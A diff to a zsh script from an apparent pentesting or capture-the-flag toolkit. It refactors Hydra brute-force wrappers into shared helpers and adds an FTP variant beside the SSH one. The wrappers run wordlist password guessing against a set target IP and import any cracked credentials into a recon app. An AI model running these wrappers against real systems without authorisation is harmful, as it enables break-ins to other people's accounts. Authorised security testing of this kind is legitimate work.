@@ -39,20 +39,19 @@ hydraweb() {
     "$form"
 }
 
-hydrassh() {
-  local target="" user="" wordlist="$RECON_PASSLIST"
+# usage: _hydra-parse-args <default_user> [args...]
+# sets: _HYDRA_TARGET _HYDRA_USER _HYDRA_WORDLIST
+_hydra-parse-args() {
+  local default_user="$1"
+  shift
   local -a args=("$@")
 
-  if [[ $# -lt 1 ]]; then
-    echo "usage: hydrassh [target] <user> [wordlist]"
-    echo "  default wordlist: \$RECON_PASSLIST"
-    echo "  omit target when \$IP is set (target-set <ip>)"
-    return 1
-  fi
+  _HYDRA_WORDLIST="$RECON_PASSLIST"
+  _HYDRA_TARGET=""
+  _HYDRA_USER=""
 
-  # zsh arrays are 1-based; do not use $# here (it is the function's argc, not args length)
   if [[ -n "${args[-1]}" && -f "${args[-1]:A}" ]]; then
-    wordlist="${args[-1]:A}"
+    _HYDRA_WORDLIST="${args[-1]:A}"
     if (( ${#args[@]} > 1 )); then
       args=("${args[1,-2]}")
     else
@@ -61,43 +60,83 @@ hydrassh() {
   fi
 
   if [[ ${#args[@]} -ge 2 && "${args[1]}" =~ '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' ]]; then
-    target="${args[1]}"
-    user="${args[2]}"
+    _HYDRA_TARGET="${args[1]}"
+    _HYDRA_USER="${args[2]}"
   elif [[ ${#args[@]} -eq 2 ]]; then
-    target="${args[1]}"
-    user="${args[2]}"
+    _HYDRA_TARGET="${args[1]}"
+    _HYDRA_USER="${args[2]}"
   elif [[ ${#args[@]} -eq 1 ]]; then
-    target="${IP:-}"
-    user="${args[1]}"
+    _HYDRA_TARGET="${IP:-}"
+    _HYDRA_USER="${args[1]}"
+  elif [[ ${#args[@]} -eq 0 ]]; then
+    _HYDRA_TARGET="${IP:-}"
+    _HYDRA_USER="$default_user"
   else
-    echo "usage: hydrassh [target] <user> [wordlist]"
     return 1
   fi
 
-  if [[ -z "$target" || -z "$user" ]]; then
-    echo "usage: hydrassh [target] <user> [wordlist]  (or: target-set <ip> first)"
-    return 1
-  fi
+  [[ -n "$_HYDRA_TARGET" && -n "$_HYDRA_USER" ]]
+}
+
+_hydra-run-service() {
+  local service="$1"
+  local target="$2"
+  local user="$3"
+  local wordlist="$4"
+  local threads="$5"
+  local log_prefix="$6"
 
   if [[ ! -f "$wordlist" ]]; then
     echo "wordlist not found: $wordlist"
     return 1
   fi
 
-  echo "[*] target: ssh://$target  user: $user"
+  echo "[*] target: ${service}://$target  user: $user"
   echo "[*] wordlist: $wordlist"
 
   local log rc
-  log="$(mktemp "${TMPDIR:-/tmp}/hydrassh.XXXXXX")"
+  log="$(mktemp "${TMPDIR:-/tmp}/${log_prefix}.XXXXXX")"
   trap 'rm -f "$log"' EXIT INT TERM
 
   hydra -l "$user" \
     -P "$wordlist" \
-    -t 32 -f -V \
-    ssh://"$target" 2>&1 | tee "$log"
+    -t "$threads" \
+    -f -V \
+    "${service}://$target" 2>&1 | tee "$log"
   rc=${pipestatus[1]}
 
   python3 "$RECON_APP" creds-import-hydra "$target" --file "$log"
 
   return $rc
+}
+
+hydrassh() {
+  if [[ $# -lt 1 ]]; then
+    echo "usage: hydrassh [target] <user> [wordlist]"
+    echo "  default wordlist: \$RECON_PASSLIST"
+    echo "  omit target when \$IP is set (target-set <ip>)"
+    return 1
+  fi
+
+  _hydra-parse-args "" "$@" || {
+    echo "usage: hydrassh [target] <user> [wordlist]  (or: target-set <ip> first)"
+    return 1
+  }
+
+  _hydra-run-service ssh "$_HYDRA_TARGET" "$_HYDRA_USER" "$_HYDRA_WORDLIST" 32 hydrassh
+}
+
+hydraftp() {
+  _hydra-parse-args anonymous "$@" || {
+    echo "usage: hydraftp [target] [user] [wordlist]"
+    echo "  default user: anonymous"
+    echo "  omit target when \$IP is set (target-set <ip>)"
+    echo "  examples:"
+    echo "    hydraftp                    # anonymous @ \$IP"
+    echo "    hydraftp ./locks.txt        # anonymous + wordlist"
+    echo "    hydraftp ftpuser ./locks.txt"
+    return 1
+  }
+
+  _hydra-run-service ftp "$_HYDRA_TARGET" "$_HYDRA_USER" "$_HYDRA_WORDLIST" 16 hydraftp
 }
